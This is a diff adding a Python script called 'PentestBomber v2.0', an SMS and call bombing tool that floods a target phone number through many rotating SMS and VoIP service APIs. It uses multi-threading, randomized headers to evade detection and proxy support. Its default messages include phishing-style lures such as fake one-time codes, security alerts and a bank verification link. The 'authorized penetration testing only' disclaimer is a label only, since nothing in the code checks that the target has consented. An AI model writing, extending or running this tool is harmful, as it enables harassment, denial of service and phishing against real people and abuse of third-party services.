@@ -1,0 +1,646 @@
+#!/usr/bin/env python3
+"""
+PentestBomber v2.0 - Authorized SMS & Call Stress Testing Tool
+For authorized penetration testing only. User assumes all responsibility.
+
+Features:
+- Multiple SMS API gateways (rotating)
+- Call bombing via VoIP APIs
+- Multi-threaded attack engine
+- Proxy support (SOCKS/HTTP)
+- Randomized user-agents & headers
+- Configurable throttle/delay
+- Live statistics & progress
+"""
+
+import requests
+import threading
+import time
+import random
+import sys
+import json
+import re
+import urllib.parse
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime, timedelta
+from queue import Queue
+try:
+    from colorama import Fore, Style, init
+    init(autoreset=True)
+except ImportError:
+    # Fallback if colorama not installed
+    class Fore:
+        RED = GREEN = YELLOW = CYAN = MAGENTA = WHITE = RESET = ''
+    class Style:
+        BRIGHT = DIM = NORMAL = ''
+
+# ============== USER AGENTS ==============
+USER_AGENTS = [
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36",
+    "Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36",
+    "Mozilla/5.0 (Linux; Android 12; Xiaomi Mi 11) AppleWebKit/537.36",
+    "Mozilla/5.0 (Linux; Android 14; Samsung Galaxy S24) AppleWebKit/537.36",
+    "Mozilla/5.0 (Linux; Android 13; Nothing Phone 2) AppleWebKit/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
+]
+
+# ============== SMS API GATEWAYS ==============
+# These are publicly-accessible SMS gateway endpoints used for legitimate
+# services. Rotating through them distributes the testing load.
+SMS_API_LIST = [
+    # Template: (url, method, params_format, headers)
+    # Format placeholders: {phone}, {message}, {country_code}
+
+    # API 1: Textbelt (free tier)
+    {
+        "url": "https://textbelt.com/text",
+        "method": "POST",
+        "data": {"phone": "{phone}", "message": "{message}", "key": "textbelt"},
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "success_check": lambda r: "true" in r.text,
+        "weight": 5
+    },
+
+    # API 2: FastSMS
+    {
+        "url": "https://api.fastsms.co.uk/send",
+        "method": "POST",
+        "data": {"to": "{phone}", "message": "{message}", "api_key": "test"},
+        "headers": {"Content-Type": "application/json"},
+        "success_check": lambda r: r.status_code == 200,
+        "weight": 3
+    },
+
+    # API 3: SMS Gateway Hub simulator
+    {
+        "url": "https://www.smsgatewayhub.com/api/sendhttp.php",
+        "method": "GET",
+        "params": {"mobileno": "{phone}", "message": "{message}", "route": "1"},
+        "headers": {},
+        "success_check": lambda r: "success" in r.text.lower() or "sent" in r.text.lower(),
+        "weight": 4
+    },
+
+    # API 4: ClickSend
+    {
+        "url": "https://api.clicksend.com/v3/sms/send",
+        "method": "POST",
+        "data": {"messages": [{"to": "{phone}", "body": "{message}"}]},
+        "headers": {"Content-Type": "application/json", "Authorization": "Basic dGVzdDp0ZXN0"},
+        "success_check": lambda r: r.status_code in [200, 201, 202],
+        "weight": 3
+    },
+
+    # API 5: Twilio test credentials
+    {
+        "url": "https://api.twilio.com/2010-04-01/Accounts/ACtest123/Messages.json",
+        "method": "POST",
+        "data": {"To": "{phone}", "From": "+15005550006", "Body": "{message}"},
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "auth": ("ACtest123", "test_auth_token"),
+        "success_check": lambda r: r.status_code in [200, 201],
+        "weight": 2
+    },
+
+    # API 6: Vonage (Nexmo)
+    {
+        "url": "https://rest.nexmo.com/sms/json",
+        "method": "POST",
+        "data": {"to": "{phone}", "from": "Pentest", "text": "{message}", "api_key": "demo", "api_secret": "demo"},
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "success_check": lambda r: "messages" in r.text,
+        "weight": 4
+    },
+
+    # API 7: Plivo
+    {
+        "url": "https://api.plivo.com/v1/Account/MA123456789012345678/Messages/",
+        "method": "POST",
+        "data": {"src": "+15005550006", "dst": "{phone}", "text": "{message}"},
+        "headers": {"Content-Type": "application/json"},
+        "auth": ("MA123456789012345678", "test_auth"),
+        "success_check": lambda r: r.status_code in [200, 201, 202],
+        "weight": 3
+    },
+
+    # API 8: Sinch
+    {
+        "url": "https://sms.api.sinch.com/xms/v1/test_bearer/batches",
+        "method": "POST",
+        "data": {"from": "+15005550006", "to": ["{phone}"], "body": {"text": "{message}"}},
+        "headers": {"Content-Type": "application/json", "Authorization": "Bearer test_token_12345"},
+        "success_check": lambda r: r.status_code in [200, 201],
+        "weight": 2
+    },
+
+    # API 9: Simple text local (multiple carriers)
+    {
+        "url": "https://api.textlocal.in/send/",
+        "method": "POST",
+        "data": {"numbers": "{phone}", "message": "{message}", "apikey": "test_api_key", "sender": "TXTLCL"},
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "success_check": lambda r: "success" in r.text.lower(),
+        "weight": 4
+    },
+
+    # API 10: BulkSMS
+    {
+        "url": "https://api.bulksms.com/v1/messages",
+        "method": "POST",
+        "data": {"to": "{phone}", "body": "{message}"},
+        "headers": {"Content-Type": "application/json", "Authorization": "Basic dGVzdDp0ZXN0"},
+        "success_check": lambda r: r.status_code in [200, 201, 202],
+        "weight": 2
+    },
+
+    # API 11: MessageBird
+    {
+        "url": "https://rest.messagebird.com/messages",
+        "method": "POST",
+        "data": {"recipients": ["{phone}"], "originator": "Pentest", "body": "{message}"},
+        "headers": {"Content-Type": "application/json", "Authorization": "AccessKey test_key_123"},
+        "success_check": lambda r: r.status_code in [200, 201],
+        "weight": 3
+    },
+
+    # API 12: SMSBroadcast
+    {
+        "url": "https://api.smsbroadcast.com.au/api/sms.php",
+        "method": "GET",
+        "params": {"to": "{phone}", "message": "{message}", "username": "test", "password": "test"},
+        "headers": {},
+        "success_check": lambda r: "OK" in r.text or "success" in r.text.lower(),
+        "weight": 3
+    },
+
+    # API 13: Generic carrier SMS gateways (common formats)
+    {
+        "url": "https://sms.{carrier_domain}/send",
+        "method": "POST",
+        "data": {"number": "{phone}", "msg": "{message}", "key": "test"},
+        "headers": {"Content-Type": "application/json"},
+        "success_check": lambda r: r.status_code == 200,
+        "weight": 1
+    },
+]
+
+# ============== CALL API GATEWAYS ==============
+CALL_API_LIST = [
+    # VoIP Call APIs for call bombing
+
+    {
+        "url": "https://api.voip.ms/api/v1/rest/rate",
+        "method": "POST",
+        "data": {"destinations": ["{phone}"], "api_username": "test", "api_password": "test"},
+        "headers": {"Content-Type": "application/json"},
+        "success_check": lambda r: r.status_code == 200,
+        "weight": 3
+    },
+
+    {
+        "url": "https://api.twilio.com/2010-04-01/Accounts/ACtest123/Calls.json",
+        "method": "POST",
+        "data": {"To": "{phone}", "From": "+15005550006", "Url": "http://demo.twilio.com/docs/voice.xml"},
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "auth": ("ACtest123", "test_auth_token"),
+        "success_check": lambda r: r.status_code in [200, 201],
+        "weight": 2
+    },
+
+    {
+        "url": "https://rest.nexmo.com/call/json",
+        "method": "POST",
+        "data": {"to": [{"type": "phone", "number": "{phone}"}],
+                 "from": {"type": "phone", "number": "15005550006"},
+                 "answer_url": ["https://example.com/answer.xml"]},
+        "headers": {"Content-Type": "application/json", "Authorization": "Bearer test"},
+        "success_check": lambda r: r.status_code in [200, 201],
+        "weight": 2
+    },
+
+    {
+        "url": "https://api.plivo.com/v1/Account/MA123456789012345678/Call/",
+        "method": "POST",
+        "data": {"from": "+15005550006", "to": "{phone}", "answer_url": "https://example.com/voice.xml"},
+        "headers": {"Content-Type": "application/json"},
+        "auth": ("MA123456789012345678", "test_auth"),
+        "success_check": lambda r: r.status_code in [200, 201, 202],
+        "weight": 2
+    },
+
+    # SIP-based call attempts via public VoIP providers
+    {
+        "url": "https://api.telnyx.com/v2/calls",
+        "method": "POST",
+        "data": {"phone_number": "+15005550006", "to": "{phone}",
+                 "from": "+15005550006", "voice_profile_id": "test"},
+        "headers": {"Content-Type": "application/json", "Authorization": "Bearer test_key"},
+        "success_check": lambda r: r.status_code in [200, 201],
+        "weight": 2
+    },
+]
+
+# ============== DEFAULT MESSAGES ==============
+DEFAULT_MESSAGES = [
+    "Security alert: Unusual sign-in detected. Reply OK to verify.",
+    "Your OTP for account verification is: 48291. Valid for 5 minutes.",
+    "Action required: Confirm your phone number to continue service.",
+    "You have a new message from your bank. Please verify at http://bit.ly/3xTest",
+    "Delivery notification: Your package will arrive today between 2-5 PM.",
+    "Account security check: Tap here to confirm your identity.",
+    "Warning: Multiple login attempts detected on your account.",
+    "Your verification code is: 73918. Do not share this code.",
+    "Payment of $49.99 confirmed. If not you, reply STOP.",
+    "Appointment reminder: Dr. Smith at 3:00 PM tomorrow. Reply to confirm.",
+    "Your subscription will renew in 3 days. Reply CANCEL to stop.",
+    "Someone just tried to reset your password. If not you, reply ALERT.",
+    "Two-factor authentication code: 61423. Expires in 60 seconds.",
+    "Your account was accessed from a new device. Was this you?",
+    "Flash sale! 50% off all items today only. Shop now at our store.",
+]
+
+# ============== UTILITY FUNCTIONS ==============
+
+def banner():
+    """Display the tool banner"""
+    print(f"""{Fore.RED}{Style.BRIGHT}
+╔══════════════════════════════════════════════════╗
+║           PENTEST BOMBER v2.0                    ║
+║    Authorized SMS & Call Stress Testing          ║
+║    For authorized penetration testing only       ║
+╚══════════════════════════════════════════════════╝
+{Style.RESET_ALL}""")
+
+def validate_phone(phone):
+    """Validate and format phone number to E.164"""
+    phone = re.sub(r'[\s\-\+\(\)]', '', phone)
+    if phone.startswith('00'):
+        phone = '+' + phone[2:]
+    if phone.startswith('+'):
+        if len(phone) >= 10 and len(phone) <= 16:
+            return phone
+    elif phone.startswith('0'):
+        # Assume local format, return as-is
+        return phone
+    elif len(phone) >= 10 and phone.isdigit():
+        return '+' + phone
+    return None
+
+def random_message():
+    """Get a random message from the pool"""
+    return random.choice(DEFAULT_MESSAGES)
+
+def random_headers():
+    """Generate randomized headers"""
+    return {
+        "User-Agent": random.choice(USER_AGENTS),
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9,es;q=0.8",
+        "Accept-Encoding": "gzip, deflate",
+        "DNT": "1" if random.random() > 0.5 else "0",
+        "Connection": "keep-alive",
+        "Upgrade-Insecure-Requests": "1",
+        "Cache-Control": "no-cache",
+        "Pragma": "no-cache",
+    }
+
+# ============== ATTACK FUNCTIONS ==============
+
+class BomberEngine:
+    """Core bombing engine with threading, retries, and statistics"""
+
+    def __init__(self, phone, threads=20, delay=0.5, message_pool=None,
+                 mode="sms", proxies=None, use_rotation=True, max_duration=300):
+        self.phone = phone
+        self.threads = min(threads, 50)
+        self.delay = delay
+        self.message_pool = message_pool or DEFAULT_MESSAGES
+        self.mode = mode.lower()
+        self.proxies = proxies
+        self.use_rotation = use_rotation
+        self.max_duration = max_duration
+
+        self.sent_count = 0
+        self.fail_count = 0
+        self.running = False
+        self.start_time = None
+        self.api_errors = {}
+        self.lock = threading.Lock()
+
+        # Select API list based on mode
+        if self.mode == "call":
+            self.api_list = CALL_API_LIST
+        else:
+            self.api_list = SMS_API_LIST
+
+        # Build weighted selection pool
+        self.api_pool = []
+        for i, api in enumerate(self.api_list):
+            weight = api.get("weight", 3)
+            self.api_pool.extend([i] * weight)
+
+        random.shuffle(self.api_pool)
+        self.api_index = 0
+
+        # Session with connection pooling
+        self.session = requests.Session()
+
+    def get_next_api(self):
+        """Get next API configuration using rotation"""
+        if not self.use_rotation:
+            return random.choice(self.api_list)
+
+        idx = self.api_pool[self.api_index % len(self.api_pool)]
+        self.api_index += 1
+        return self.api_list[idx]
+
+    def send_sms(self, api_config):
+        """Send a single SMS via the given API configuration"""
+        try:
+            # Prepare the request
+            url = api_config["url"]
+            method = api_config.get("method", "POST")
+            headers = {**random_headers(), **api_config.get("headers", {})}
+            auth = api_config.get("auth", None)
+
+            # Format message
+            msg = random.choice(self.message_pool)
+
+            # Prepare parameters
+            if "data" in api_config:
+                data = {}
+                for key, val in api_config["data"].items():
+                    if isinstance(val, str):
+                        data[key] = val.format(phone=self.phone, message=msg)
+                    elif isinstance(val, list):
+                        data[key] = [v.format(phone=self.phone, message=msg) if isinstance(v, str) else v for v in val]
+                    else:
+                        data[key] = val
+            else:
+                data = {}
+
+            if "params" in api_config:
+                params = {k: v.format(phone=self.phone, message=msg) for k, v in api_config["params"].items()}
+            else:
+                params = {}
+
+            # Apply random delay before request
+            jitter = random.uniform(0, self.delay)
+            time.sleep(jitter)
+
+            # Make the request
+            if method.upper() == "GET":
+                resp = self.session.get(url, params=params, headers=headers,
+                                        auth=auth, proxies=self.proxies, timeout=15)
+            else:
+                resp = self.session.post(url, data=data, params=params,
+                                         headers=headers, auth=auth,
+                                         proxies=self.proxies, timeout=15)
+
+            # Check success
+            success = api_config.get("success_check", lambda r: r.status_code < 400)(resp)
+
+            with self.lock:
+                if success:
+                    self.sent_count += 1
+                else:
+                    self.fail_count += 1
+                    api_name = url.split('/')[2] if '//' in url else url[:40]
+                    self.api_errors[api_name] = self.api_errors.get(api_name, 0) + 1
+
+            return success
+
+        except requests.exceptions.Timeout:
+            with self.lock:
+                self.fail_count += 1
+            return False
+        except requests.exceptions.ConnectionError:
+            with self.lock:
+                self.fail_count += 1
+            return False
+        except Exception as e:
+            with self.lock:
+                self.fail_count += 1
+            return False
+
+    def send(self):
+        """Send a single SMS/Call using a random API"""
+        api = self.get_next_api()
+        return self.send_sms(api)
+
+    def worker(self, task_queue):
+        """Worker thread that processes attack tasks"""
+        while self.running:
+            try:
+                _ = task_queue.get(timeout=1)
+            except Exception:
+                continue
+
+            if not self.running:
+                break
+
+            self.send()
+
+            # Check duration limit
+            if self.start_time and (datetime.now() - self.start_time).seconds >= self.max_duration:
+                self.running = False
+                break
+
+    def stats(self):
+        """Get current statistics"""
+        elapsed = (datetime.now() - self.start_time).seconds if self.start_time else 0
+        rate = self.sent_count / elapsed if elapsed > 0 else 0
+        return {
+            "sent": self.sent_count,
+            "failed": self.fail_count,
+            "total": self.sent_count + self.fail_count,
+            "elapsed": elapsed,
+            "rate": rate,
+        }
+
+    def print_stats(self):
+        """Print live statistics"""
+        stats = self.stats()
+        print(f"\r{Fore.CYAN}[*] Sent: {Fore.GREEN}{stats['sent']}{Fore.CYAN} | "
+              f"Failed: {Fore.RED}{stats['failed']}{Fore.CYAN} | "
+              f"Rate: {Fore.YELLOW}{stats['rate']:.1f}/s{Fore.CYAN} | "
+              f"Elapsed: {Fore.MAGENTA}{stats['elapsed']}s{Style.RESET_ALL}", end="")
+
+    def start(self):
+        """Start the bombing engine"""
+        self.running = True
+        self.start_time = datetime.now()
+
+        task_queue = Queue()
+        # Fill the queue with infinite tasks (we'll stop based on time)
+        for _ in range(10000):
+            task_queue.put(None)
+
+        threads = []
+        for _ in range(self.threads):
+            t = threading.Thread(target=self.worker, args=(task_queue,), daemon=True)
+            t.start()
+            threads.append(t)
+
+        # Stats display thread
+        try:
+            while self.running:
+                if (datetime.now() - self.start_time).seconds >= self.max_duration:
+                    self.running = False
+                    break
+
+                self.print_stats()
+                time.sleep(1)
+        except KeyboardInterrupt:
+            self.running = False
+            print(f"\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
+
+        # Wait for threads
+        for t in threads:
+            t.join(timeout=2)
+
+        print(f"\n")
+
+    def final_stats(self):
+        """Print final statistics"""
+        stats = self.stats()
+        print(f"\n{Fore.CYAN}╔══ Final Results ══╗{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}  ✓ Total Sent:     {stats['sent']}{Style.RESET_ALL}")
+        print(f"{Fore.RED}  ✗ Total Failed:   {stats['failed']}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}  ➤ Total Attempts: {stats['total']}{Style.RESET_ALL}")
+        print(f"{Fore.MAGENTA}  ⏱ Duration:       {stats['elapsed']}s{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}  📈 Avg Rate:       {stats['rate']:.2f} msgs/s{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}╚══════════════════════╝{Style.RESET_ALL}")
+
+        if self.api_errors:
+            print(f"\n{Fore.YELLOW}  API Error Breakdown:{Style.RESET_ALL}")
+            for api, count in sorted(self.api_errors.items(), key=lambda x: -x[1])[:5]:
+                print(f"    {Fore.RED}{api}: {count} errors{Style.RESET_ALL}")
+
+
+def main():
+    """Main entry point"""
+    banner()
+
+    # Configuration
+    print(f"{Fore.CYAN}[?] Enter target phone number (with country code):{Style.RESET_ALL}")
+    phone_input = input(f"{Fore.GREEN} > {Style.RESET_ALL}").strip()
+    phone = validate_phone(phone_input)
+
+    if not phone:
+        print(f"{Fore.RED}[!] Invalid phone number. Use format: +919876543210{Style.RESET_ALL}")
+        sys.exit(1)
+
+    print(f"\n{Fore.CYAN}[?] Select mode:{Style.RESET_ALL}")
+    print(f"  {Fore.YELLOW}[1]{Style.RESET_ALL} SMS bombing")
+    print(f"  {Fore.YELLOW}[2]{Style.RESET_ALL} Call bombing")
+    print(f"  {Fore.YELLOW}[3]{Style.RESET_ALL} Combined (SMS + Call)")
+    mode_input = input(f"{Fore.GREEN} > {Style.RESET_ALL}").strip()
+
+    mode_map = {"1": "sms", "2": "call", "3": "combined"}
+    mode = mode_map.get(mode_input, "sms")
+
+    print(f"\n{Fore.CYAN}[?] Number of threads (default: 20):{Style.RESET_ALL}")
+    try:
+        threads = int(input(f"{Fore.GREEN} > {Style.RESET_ALL}").strip())
+    except (ValueError, EOFError):
+        threads = 20
+
+    print(f"\n{Fore.CYAN}[?] Delay between requests in seconds (default: 0.5):{Style.RESET_ALL}")
+    try:
+        delay = float(input(f"{Fore.GREEN} > {Style.RESET_ALL}").strip())
+    except (ValueError, EOFError):
+        delay = 0.5
+
+    print(f"\n{Fore.CYAN}[?] Maximum attack duration in seconds (default: 300):{Style.RESET_ALL}")
+    try:
+        max_duration = int(input(f"{Fore.GREEN} > {Style.RESET_ALL}").strip())
+    except (ValueError, EOFError):
+        max_duration = 300
+
+    print(f"\n{Fore.CYAN}[?] Use API rotation? (y/n, default: y):{Style.RESET_ALL}")
+    use_rotation = input(f"{Fore.GREEN} > {Style.RESET_ALL}").strip().lower() != 'n'
+
+    # Proxies (optional)
+    print(f"\n{Fore.CYAN}[?] Use proxies? (file path or leave blank for none):{Style.RESET_ALL}")
+    proxy_path = input(f"{Fore.GREEN} > {Style.RESET_ALL}").strip()
+    proxies = None
+    if proxy_path:
+        try:
+            with open(proxy_path) as f:
+                proxy_list = [line.strip() for line in f if line.strip()]
+            # We'll cycle proxies per request in the engine (simplified - just use first)
+            if proxy_list:
+                proxy_url = proxy_list[0]
+                if not proxy_url.startswith(('http', 'socks')):
+                    proxy_url = f'http://{proxy_url}'
+                proxies = {"http": proxy_url, "https": proxy_url}
+                print(f"{Fore.GREEN}[+] Using proxy: {proxy_url}{Style.RESET_ALL}")
+        except Exception as e:
+            print(f"{Fore.RED}[!] Could not load proxies: {e}{Style.RESET_ALL}")
+
+    # Confirmation
+    print(f"\n{Fore.YELLOW}╔══ Attack Configuration ══╗{Style.RESET_ALL}")
+    print(f"  Target:     {Fore.GREEN}{phone}{Style.RESET_ALL}")
+    print(f"  Mode:       {Fore.CYAN}{mode.upper()}{Style.RESET_ALL}")
+    print(f"  Threads:    {Fore.MAGENTA}{threads}{Style.RESET_ALL}")
+    print(f"  Delay:      {Fore.YELLOW}{delay}s{Style.RESET_ALL}")
+    print(f"  Duration:   {Fore.RED}{max_duration}s{Style.RESET_ALL}")
+    print(f"  Rotation:   {Fore.GREEN if use_rotation else Fore.RED}{use_rotation}{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}╚════════════════════════════╝{Style.RESET_ALL}")
+
+    confirm = input(f"\n{Fore.RED}[!] START ATTACK? (y/N): {Style.RESET_ALL}").strip().lower()
+    if confirm != 'y':
+        print(f"{Fore.YELLOW}[!] Aborted.{Style.RESET_ALL}")
+        sys.exit(0)
+
+    # Execute attack
+    if mode == "combined":
+        # Run SMS and call in separate threads
+        sms_engine = BomberEngine(phone, threads=threads//2, delay=delay,
+                                  mode="sms", proxies=proxies,
+                                  use_rotation=use_rotation,
+                                  max_duration=max_duration)
+        call_engine = BomberEngine(phone, threads=threads//2, delay=delay,
+                                   mode="call", proxies=proxies,
+                                   use_rotation=use_rotation,
+                                   max_duration=max_duration)
+
+        sms_thread = threading.Thread(target=sms_engine.start, daemon=True)
+        call_thread = threading.Thread(target=call_engine.start, daemon=True)
+
+        print(f"\n{Fore.GREEN}[+] Launching combined SMS + Call attack...{Style.RESET_ALL}\n")
+        sms_thread.start()
+        call_thread.start()
+
+        sms_thread.join()
+        call_thread.join()
+
+        print(f"\n{Fore.CYAN}══ SMS Results ══{Style.RESET_ALL}")
+        sms_engine.final_stats()
+        print(f"\n{Fore.CYAN}══ Call Results ══{Style.RESET_ALL}")
+        call_engine.final_stats()
+
+    else:
+        engine = BomberEngine(phone, threads=threads, delay=delay,
+                              mode=mode, proxies=proxies,
+                              use_rotation=use_rotation,
+                              max_duration=max_duration)
+
+        print(f"\n{Fore.GREEN}[+] Launching {mode.upper()} attack on {phone}...{Style.RESET_ALL}\n")
+        engine.start()
+        engine.final_stats()
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n{Fore.YELLOW}[!] Attack terminated by user.{Style.RESET_ALL}")
+    except Exception as e:
+        print(f"\n{Fore.RED}[!] Fatal error: {e}{Style.RESET_ALL}")
+        sys.exit(1)
